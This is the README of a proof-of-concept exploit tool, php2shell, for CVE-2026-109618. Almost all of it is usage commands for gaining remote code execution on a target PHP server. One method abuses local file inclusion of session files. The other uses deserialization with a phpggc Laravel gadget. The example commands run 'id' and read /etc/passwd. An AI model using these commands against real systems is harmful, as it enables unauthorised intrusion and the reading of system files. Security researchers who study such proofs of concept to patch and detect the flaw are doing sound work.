# php2shell
phpwshell poc for CVE-2026-109618

# Basic RCE via LFI
python3 php2shell_poc.py rce \
    --url http://target/index.php \
    --cmd "id" \
    --lfi-url http://target/vuln.php \
    --lfi-param page \
    --session-path /tmp

# Without knowing session path (tries common defaults)
python3 php2shell_poc.py rce \
    --url http://target/index.php \
    --cmd "cat /etc/passwd" \
    --lfi-url http://target/vuln.php


# Generate a gadget with phpggc, then:
python3 php2shell_poc.py rce \
    --url http://target/index.php \
    --cmd "id" \
    --method deser \
    --gadget 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{...}'
